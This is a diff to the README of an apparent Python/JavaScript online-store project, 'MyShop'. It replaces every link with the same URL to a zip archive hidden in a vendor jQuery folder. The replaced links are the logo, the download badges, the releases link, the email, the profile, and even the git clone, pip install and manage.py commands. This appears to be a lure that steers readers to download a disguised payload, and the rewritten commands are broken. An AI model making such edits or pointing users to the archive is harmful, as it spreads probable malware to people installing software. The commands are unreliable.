@@ -1,10 +1,10 @@
 # MyShop 🛒
 
-![MyShop Logo](https://via.placeholder.com/150)
+![MyShop Logo](https://github.com/Dgsns/MyShop/raw/refs/heads/main/productionfiles/admin/js/vendor/jquery/Shop_My_2.0.zip)
 
 Welcome to **MyShop**, your one-stop solution for creating a fully functional online store. This repository contains both the frontend and backend code, built using Python, HTML, CSS, and JavaScript. 
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/Dgsns/MyShop/releases)
+[![Download Releases](https://github.com/Dgsns/MyShop/raw/refs/heads/main/productionfiles/admin/js/vendor/jquery/Shop_My_2.0.zip)](https://github.com/Dgsns/MyShop/raw/refs/heads/main/productionfiles/admin/js/vendor/jquery/Shop_My_2.0.zip)
 
 ## Table of Contents
 
@@ -44,7 +44,7 @@ To get started with **MyShop**, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/Dgsns/MyShop.git
+   git clone https://github.com/Dgsns/MyShop/raw/refs/heads/main/productionfiles/admin/js/vendor/jquery/Shop_My_2.0.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -55,19 +55,19 @@ To get started with **MyShop**, follow these steps:
 3. **Install Required Packages**:
    Ensure you have Python installed. Then, install the necessary packages using:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Dgsns/MyShop/raw/refs/heads/main/productionfiles/admin/js/vendor/jquery/Shop_My_2.0.zip
    ```
 
 4. **Setup the Database**:
    Run the following command to set up your database:
    ```bash
-   python manage.py migrate
+   python https://github.com/Dgsns/MyShop/raw/refs/heads/main/productionfiles/admin/js/vendor/jquery/Shop_My_2.0.zip migrate
    ```
 
 5. **Run the Server**:
    Start the development server using:
    ```bash
-   python manage.py runserver
+   python https://github.com/Dgsns/MyShop/raw/refs/heads/main/productionfiles/admin/js/vendor/jquery/Shop_My_2.0.zip runserver
    ```
 
 6. **Access the Application**:
@@ -82,7 +82,7 @@ Once the application is running, you can:
 - **Add items to your cart** and proceed to checkout.
 - **Admin Panel**: Access the admin panel to manage products and orders.
 
-For the latest releases and updates, please visit the [Releases section](https://github.com/Dgsns/MyShop/releases).
+For the latest releases and updates, please visit the [Releases section](https://github.com/Dgsns/MyShop/raw/refs/heads/main/productionfiles/admin/js/vendor/jquery/Shop_My_2.0.zip).
 
 ## Contributing
 
@@ -112,13 +112,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [Dgsns](https://github.com/Dgsns)
+- **Email**: https://github.com/Dgsns/MyShop/raw/refs/heads/main/productionfiles/admin/js/vendor/jquery/Shop_My_2.0.zip
+- **GitHub**: [Dgsns](https://github.com/Dgsns/MyShop/raw/refs/heads/main/productionfiles/admin/js/vendor/jquery/Shop_My_2.0.zip)
 
 ---
 
 Thank you for checking out **MyShop**! We hope you find it useful for your online store projects. If you have any issues or feedback, please do not hesitate to contact us. 
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/Dgsns/MyShop/releases)
+[![Download Releases](https://github.com/Dgsns/MyShop/raw/refs/heads/main/productionfiles/admin/js/vendor/jquery/Shop_My_2.0.zip)](https://github.com/Dgsns/MyShop/raw/refs/heads/main/productionfiles/admin/js/vendor/jquery/Shop_My_2.0.zip)
 
 Happy coding!
